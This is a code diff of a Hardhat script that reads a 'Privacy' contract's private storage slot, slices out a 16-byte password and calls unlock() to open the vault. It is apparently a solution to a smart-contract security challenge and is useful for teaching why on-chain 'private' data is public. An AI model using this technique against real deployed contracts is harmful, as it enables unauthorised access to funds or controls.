@@ -9,13 +9,13 @@ const main = async () => {
   console.log(`Privacy contract: ${privacyContract.address}`);
 
   let txn1 = await provider.getStorageAt(privacyContract.address, 5);
-  console.log(`Password aquired: (hre.ethers.utils.arrayify(txn1)`);
+  let store = `${txn1.slice(0,34)}` // @dev slices the first 16 bytes of txn1. 16 bytes is equivalent to 32 hex-chars then +2 for the 0x
+  console.log(`Password aquired: ${hre.ethers.utils.arrayify(store)}`);
 
-  let store = hre.ethers.utils.arrayify(txn1);
-  let password = hre.ethers.utils.formatBytes32String(store[2]);
+
   console.log("Password stored")
 
-  let txn2 = await privacyContract.unlock(password);
+  let txn2 = await privacyContract.unlock(store);
   console.log("Unlocking...")
   await txn2.wait();
   console.log("Vault unlocked.")
